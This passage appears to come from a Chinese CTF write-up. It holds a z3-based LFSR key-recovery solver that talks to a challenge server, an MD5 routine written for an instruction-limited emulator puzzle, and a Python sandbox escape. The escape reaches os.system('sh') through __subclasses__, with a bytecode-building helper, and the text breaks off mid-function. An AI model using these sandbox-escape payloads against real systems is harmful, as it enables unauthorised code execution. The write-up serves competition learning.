    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">self</span>):</span>
        x = [self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.f_IN]
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.f_OUT)
 
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">h</span>(<span class="hljs-params">self</span>):</span>
        x = [self.NFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.h_IN]
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.h_OUT)        

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span>(<span class="hljs-params">self</span>):</span>
        x = self.NFSR
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.TAP2)  

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clock</span>(<span class="hljs-params">self</span>):</span>
        self.LFSR = self.LFSR[<span class="hljs-number">1</span>: ] + [_<span class="hljs-built_in">sum</span>(self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.TAP)]
        self.NFSR = self.NFSR[<span class="hljs-number">1</span>: ] + [self.LFSR[<span class="hljs-number">1</span>] ^ self.g()]
        <span class="hljs-keyword">return</span> self.f() ^ self.h()

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator3</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">list</span></span>):</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) == <span class="hljs-number">64</span>
        self.LFSR = key
        self.TAP = [<span class="hljs-number">0</span>, <span class="hljs-number">55</span>]
        self.f_IN = [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">24</span>, <span class="hljs-number">32</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>]
        self.f_OUT = [[<span class="hljs-number">1</span>], [<span class="hljs-number">6</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">self</span>):</span>
        x = [self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.f_IN]
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.f_OUT)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clock</span>(<span class="hljs-params">self</span>):</span>
        self.LFSR = self.LFSR[<span class="hljs-number">1</span>: ] + [_<span class="hljs-built_in">sum</span>(self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.TAP)]
        <span class="hljs-keyword">return</span> self.f()

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zer0lfsr</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, msk: <span class="hljs-built_in">int</span>, t: <span class="hljs-built_in">int</span></span>):</span>
        <span class="hljs-keyword">if</span> t == <span class="hljs-number">1</span>:
            self.g = Generator1(n2l(msk, <span class="hljs-number">64</span>))
        <span class="hljs-keyword">elif</span> t == <span class="hljs-number">2</span>:
            self.g = Generator2(n2l(msk, <span class="hljs-number">64</span>))
        <span class="hljs-keyword">else</span>:
            self.g = Generator3(n2l(msk, <span class="hljs-number">64</span>))
        self.t = t

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.t):
            o = self.g.clock()
        <span class="hljs-keyword">return</span> o
<span class="hljs-comment">#---------------------original code end---------------------#</span>


<span class="hljs-comment">#----------------------------------pow------------------------------------------#</span>
alphabet = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;!#$%&amp;*-?&#x27;</span>
<span class="hljs-comment">#print(alphabet)</span>
host,port = <span class="hljs-string">&quot;111.186.59.28&quot;</span>,<span class="hljs-number">31337</span>
context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
r = remote(host,port)
r.recvuntil(<span class="hljs-string">&quot; + &quot;</span>)
suffix = <span class="hljs-built_in">str</span>(r.recvuntil(<span class="hljs-string">&quot;)&quot;</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>]
r.recvuntil(<span class="hljs-string">&quot; == &quot;</span>)
result = <span class="hljs-built_in">str</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">3</span>]
<span class="hljs-built_in">print</span>(result)
<span class="hljs-built_in">pow</span> = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    prefix = <span class="hljs-string">&quot;&quot;</span>.join(random.choices(alphabet,k=<span class="hljs-number">4</span>))
    <span class="hljs-comment"># print(prefix)</span>
    <span class="hljs-comment"># print(prefix+suffix)</span>
    <span class="hljs-comment">#print(hashlib.sha256((prefix+suffix).encode()).hexdigest())</span>
    <span class="hljs-keyword">if</span> hashlib.sha256((prefix+suffix).encode()).hexdigest()==result:
        <span class="hljs-built_in">pow</span> = prefix
        <span class="hljs-keyword">break</span>
r.sendline(<span class="hljs-built_in">pow</span>)
<span class="hljs-comment">#---------------------------pow  end------------------------------------------#</span>

<span class="hljs-comment">#------------------try generator i-------------------------#</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]:
    r.recvuntil(<span class="hljs-string">&quot;one:&quot;</span>)
    r.sendline(<span class="hljs-built_in">str</span>(i))
    s = Solver()
    msk = BitVec(<span class="hljs-string">&#x27;msk&#x27;</span>,<span class="hljs-number">64</span>)
    r.recvuntil(<span class="hljs-string">&quot;start:::&quot;</span>)
    keystream = r.recvuntil(<span class="hljs-string">&quot;:::end&quot;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)
    <span class="hljs-built_in">print</span>(keystream[-<span class="hljs-number">6</span>:])
    keystream = keystream[:-<span class="hljs-number">6</span>]
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(keystream))
    lfsr = zer0lfsr(msk, i)
    lfsr_bits = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        c = <span class="hljs-built_in">ord</span>(keystream[i])
        temp_list = []
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
            temp_list.append(c&amp;<span class="hljs-number">1</span>)
            c &gt;&gt;= <span class="hljs-number">1</span>
        temp_list = temp_list[::-<span class="hljs-number">1</span>]
        lfsr_bits += temp_list
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(lfsr_bits))
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):
        s.add(lfsr_bits[i] == lfsr.<span class="hljs-built_in">next</span>())
        <span class="hljs-comment">#print(i)</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add finished&quot;</span>)
    <span class="hljs-built_in">print</span>(s.check())
    <span class="hljs-comment">#assert s.check()==sat</span>
    msk = s.model()[msk]
    <span class="hljs-built_in">print</span>(msk)
    r.recvuntil(<span class="hljs-string">&quot;hint: &quot;</span>)
    hint = r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>).decode()[:-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">assert</span> hashlib.sha256(<span class="hljs-built_in">str</span>(msk).encode()).hexdigest()
    r.recvuntil(<span class="hljs-string">&quot;k:&quot;</span>)
    r.sendline(<span class="hljs-built_in">str</span>(msk))
r.interactive()  

        </code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="uc_baaaby"><a class="header-link" href="#uc_baaaby"></a>uc_baaaby</h3>
<p>用 0x233 条指令计算md5</p>
<p>可能unicorn有一些trick绕过指令计数？</p>
<p>代码只能有一个block</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">uint32_t</span> s[<span class="hljs-number">64</span>] = {
    <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>,
    <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>,
    <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>,
    <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>};

<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">uint32_t</span> K[<span class="hljs-number">64</span>] = {
    <span class="hljs-number">0xd76aa478</span>, <span class="hljs-number">0xe8c7b756</span>, <span class="hljs-number">0x242070db</span>, <span class="hljs-number">0xc1bdceee</span>,
    <span class="hljs-number">0xf57c0faf</span>, <span class="hljs-number">0x4787c62a</span>, <span class="hljs-number">0xa8304613</span>, <span class="hljs-number">0xfd469501</span>,
    <span class="hljs-number">0x698098d8</span>, <span class="hljs-number">0x8b44f7af</span>, <span class="hljs-number">0xffff5bb1</span>, <span class="hljs-number">0x895cd7be</span>,
    <span class="hljs-number">0x6b901122</span>, <span class="hljs-number">0xfd987193</span>, <span class="hljs-number">0xa679438e</span>, <span class="hljs-number">0x49b40821</span>,
    <span class="hljs-number">0xf61e2562</span>, <span class="hljs-number">0xc040b340</span>, <span class="hljs-number">0x265e5a51</span>, <span class="hljs-number">0xe9b6c7aa</span>,
    <span class="hljs-number">0xd62f105d</span>, <span class="hljs-number">0x02441453</span>, <span class="hljs-number">0xd8a1e681</span>, <span class="hljs-number">0xe7d3fbc8</span>,
    <span class="hljs-number">0x21e1cde6</span>, <span class="hljs-number">0xc33707d6</span>, <span class="hljs-number">0xf4d50d87</span>, <span class="hljs-number">0x455a14ed</span>,
    <span class="hljs-number">0xa9e3e905</span>, <span class="hljs-number">0xfcefa3f8</span>, <span class="hljs-number">0x676f02d9</span>, <span class="hljs-number">0x8d2a4c8a</span>,
    <span class="hljs-number">0xfffa3942</span>, <span class="hljs-number">0x8771f681</span>, <span class="hljs-number">0x6d9d6122</span>, <span class="hljs-number">0xfde5380c</span>,
    <span class="hljs-number">0xa4beea44</span>, <span class="hljs-number">0x4bdecfa9</span>, <span class="hljs-number">0xf6bb4b60</span>, <span class="hljs-number">0xbebfbc70</span>,
    <span class="hljs-number">0x289b7ec6</span>, <span class="hljs-number">0xeaa127fa</span>, <span class="hljs-number">0xd4ef3085</span>, <span class="hljs-number">0x04881d05</span>,
    <span class="hljs-number">0xd9d4d039</span>, <span class="hljs-number">0xe6db99e5</span>, <span class="hljs-number">0x1fa27cf8</span>, <span class="hljs-number">0xc4ac5665</span>,
    <span class="hljs-number">0xf4292244</span>, <span class="hljs-number">0x432aff97</span>, <span class="hljs-number">0xab9423a7</span>, <span class="hljs-number">0xfc93a039</span>,
    <span class="hljs-number">0x655b59c3</span>, <span class="hljs-number">0x8f0ccc92</span>, <span class="hljs-number">0xffeff47d</span>, <span class="hljs-number">0x85845dd1</span>,
    <span class="hljs-number">0x6fa87e4f</span>, <span class="hljs-number">0xfe2ce6e0</span>, <span class="hljs-number">0xa3014314</span>, <span class="hljs-number">0x4e0811a1</span>,
    <span class="hljs-number">0xf7537e82</span>, <span class="hljs-number">0xbd3af235</span>, <span class="hljs-number">0x2ad7d2bb</span>, <span class="hljs-number">0xeb86d391</span>};

__attribute__((always_inline))
<span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">uint32_t</span> <span class="hljs-title">left_rotate</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> x, <span class="hljs-keyword">uint32_t</span> c)</span>
</span>{
    <span class="hljs-keyword">return</span> (x &lt;&lt; c) | (x &gt;&gt; (<span class="hljs-number">32</span> - c));
}

<span class="hljs-comment">//void md5(char data[50], char out[16])</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *data = (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0xbabecafe000</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *out = data + <span class="hljs-number">0x800</span>;
    <span class="hljs-keyword">uint32_t</span> a0 = <span class="hljs-number">0x67452301</span>;
    <span class="hljs-keyword">uint32_t</span> b0 = <span class="hljs-number">0xefcdab89</span>;
    <span class="hljs-keyword">uint32_t</span> c0 = <span class="hljs-number">0x98badcfe</span>;
    <span class="hljs-keyword">uint32_t</span> d0 = <span class="hljs-number">0x10325476</span>;
    <span class="hljs-keyword">uint32_t</span> M[<span class="hljs-number">16</span>] = {
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">0</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">1</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">2</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">3</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">4</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">5</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">6</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">7</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">8</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">9</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">10</span>),
        *(<span class="hljs-keyword">uint32_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">11</span>),
        *(<span class="hljs-keyword">uint16_t</span> *)(data + <span class="hljs-number">4</span> * <span class="hljs-number">12</span>) + (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>),
        <span class="hljs-number">0</span>,
        <span class="hljs-number">400</span>,
        <span class="hljs-number">0</span>,
    };
    <span class="hljs-keyword">uint32_t</span> A = a0, B = b0, C = c0, D = d0;
    <span class="hljs-keyword">uint32_t</span> F, g;

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK0()                       \
    {                                 \
        F = F + A + K[i] + M[g];      \
        A = D;                        \
        D = C;                        \
        C = B;                        \
        B = B + left_rotate(F, s[i]); \
    }</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK1(i)                \
    {                           \
        F = (B &amp; C) | (~B &amp; D); \
        g = i;                  \
        WORK0();                \
    }</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK2(i)                \
    {                           \
        F = (D &amp; B) | (~D &amp; C); \
        g = (5 * i + 1) % 16;   \
        WORK0();                \
    }</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK3(i)              \
    {                         \
        F = B ^ C ^ D;        \
        g = (3 * i + 5) % 16; \
        WORK0();              \
    }</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK4(i)          \
    {                     \
        F = C ^ (B | ~D); \
        g = (7 * i) % 16; \
        WORK0();          \
    }</span>

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)
        WORK1(i);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">16</span>; i &lt; <span class="hljs-number">32</span>; ++i)
        WORK2(i);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">48</span>; ++i)
        WORK3(i);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">48</span>; i &lt; <span class="hljs-number">64</span>; ++i)
        WORK4(i);

    a0 = a0 + A;
    b0 = b0 + B;
    c0 = c0 + C;
    d0 = d0 + D;
    *(<span class="hljs-keyword">uint32_t</span> *)(out + <span class="hljs-number">0</span>) = a0;
    *(<span class="hljs-keyword">uint32_t</span> *)(out + <span class="hljs-number">4</span>) = b0;
    *(<span class="hljs-keyword">uint32_t</span> *)(out + <span class="hljs-number">8</span>) = c0;
    *(<span class="hljs-keyword">uint32_t</span> *)(out + <span class="hljs-number">12</span>) = d0;
}</code></pre><p>gcc -O3 编译到汇编，自动循环展开</p>
<p>汇编前面加一句设置 rsp</p>
<p>必须走到 CODE+0x2000 才算 finished...</p>
<p class="img-container"><img src="./pngs/baby.png" alt="img"></p>
<p>最后加个这个6666前缀的指令走到0x2000</p>
<h3 id="pypypypy"><a class="header-link" href="#pypypypy"></a>pypypypy</h3>
<p>参考 <a href="https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#python3">https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#python3</a></p>
<pre class="hljs"><code>[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;os.&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(x) ][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;sh&#x27;</span>)</code></pre><p>Gift: <strong>class</strong>,  <strong>dict</strong></p>
<pre class="hljs"><code>sub = <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()
wrap = sub[<span class="hljs-number">133</span>] <span class="hljs-comment"># os._wrap_close</span>
init = wrap.__init__
glb = init.__globals__
glb[<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;sh&quot;</span>)</code></pre><p>getattribute:  a.<strong>class</strong>.<strong>dict</strong><a href="a," title="attr">&quot;<strong>getattribute</strong>&quot;</a></p>
<p>中间变量可以存到 <strong>class</strong> 和 <strong>dict</strong> 这俩name里</p>
<p>Bool: [] == [], [] != []</p>
<p>Int: False+False -&gt; 0, False+True -&gt; 1</p>
<p>更大的数字可以用1加出来</p>
<p>Str: f&quot;{xxx}&quot;</p>
<p>f&quot;{&#39;&#39;.<strong>class</strong>.<strong>dict</strong>}&quot; 含有所有要用的字符，但一个一个字符拼起来代码太长了</p>
<p>可以找包含子串的字符串</p>
<p>f&quot;{&#39;&#39;.<strong>class</strong>.<strong>class</strong>.<strong>dict</strong>}&quot; 包含 <strong>base</strong>, <strong>subclassess</strong>, <strong>init</strong>, <strong>getattribute</strong></p>
<p>f&quot;{init.<strong>class</strong>.<strong>dict</strong>}&quot; 包含 <strong>globals</strong></p>
<p>f&quot;{glb}&quot; 包含 system 和 sh</p>
<p>init.<strong>class</strong>.<strong>dict</strong>[&quot;<strong>getattribute</strong>&quot;] 不能用。。但是可以找到attrgetter</p>
<pre class="hljs"><code>attrgetter = [ x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;operator.attrgetter&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(x) ][<span class="hljs-number">0</span>]</code></pre><p>远程环境subclasses下标不一样，可以抛出异常来输出信息 {}[f&quot;{sub}&quot;]</p>
<p>最后 os._wrap_close 下标是 133，attrgetter 下标是 148</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> types
<span class="hljs-keyword">import</span> dis
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">from</span> opcode <span class="hljs-keyword">import</span> opmap, cmp_op

gift1 = <span class="hljs-string">&#x27;class&#x27;</span>
gift2 = <span class="hljs-string">&#x27;dict&#x27;</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_None</span>():</span>
    <span class="hljs-keyword">return</span> \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BUILD_LIST&quot;</span>], <span class="hljs-number">0</span>]) + \
        get_class() + \
        get_dict() + \
        gen_string(<span class="hljs-string">&quot;clear&quot;</span>) + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>]) + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BUILD_LIST&quot;</span>], <span class="hljs-number">0</span>]) + \
        call_function(<span class="hljs-number">1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_return</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;RETURN_VALUE&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_class</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;LOAD_ATTR&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_dict</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;LOAD_ATTR&quot;</span>], <span class="hljs-number">1</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_true</span>():</span>
    <span class="hljs-keyword">return</span> \
        gen_empty_str() + \
        gen_empty_str() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;COMPARE_OP&quot;</span>], cmp_op.index(<span class="hljs-string">&quot;==&quot;</span>)])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_false</span>():</span>
    <span class="hljs-keyword">return</span> \
        gen_empty_str() + \
        gen_empty_str() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;COMPARE_OP&quot;</span>], cmp_op.index(<span class="hljs-string">&quot;!=&quot;</span>)])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_zero</span>():</span>
    <span class="hljs-keyword">return</span> \
        gen_false() + \
        gen_false() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_ADD&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_one</span>():</span>
    <span class="hljs-keyword">return</span> \
        gen_true() + \
        gen_false() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_ADD&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dup_top</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;DUP_TOP&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_int</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>):</span>
    <span class="hljs-keyword">if</span> x == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> gen_zero()
    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> gen_int(-x) + <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;UNARY_NEGATIVE&quot;</span>], <span class="hljs-number">0</span>])
    b = <span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:]
    b = b[::-<span class="hljs-number">1</span>]
    n = <span class="hljs-built_in">len</span>(b)
    ans = gen_one()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> b[i] == <span class="hljs-string">&#x27;1&#x27;</span>:
            ans += dup_top()
        ans += dup_top()
        ans += <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_ADD&quot;</span>], <span class="hljs-number">0</span>])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> b[i] == <span class="hljs-string">&#x27;1&#x27;</span>:
            ans += <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_ADD&quot;</span>], <span class="hljs-number">0</span>])
    <span class="hljs-keyword">return</span> ans

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_empty_str</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BUILD_STRING&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_char</span>(<span class="hljs-params">c</span>):</span>
    s = <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-string">&#x27;&#x27;</span>.__class__.__dict__}</span>&quot;</span>
    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s:
        <span class="hljs-keyword">raise</span> ValueError()
    idx = s.index(c)
    <span class="hljs-keyword">return</span> \
        gen_empty_str() + \
        get_class() + \
        get_dict() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;FORMAT_VALUE&quot;</span>], <span class="hljs-number">1</span>]) + \
        gen_int(idx) + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_string</span>(<span class="hljs-params">helper, s: <span class="hljs-built_in">str</span></span>):</span>
    hint, code = helper()
    shint = <span class="hljs-string">f&#x27;<span class="hljs-subst">{hint}</span>&#x27;</span>
    idx = shint.find(s)
    <span class="hljs-keyword">return</span> code + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;FORMAT_VALUE&quot;</span>], <span class="hljs-number">1</span>]) + \
        gen_int(idx) + \
        gen_int(idx + <span class="hljs-built_in">len</span>(s)) + \
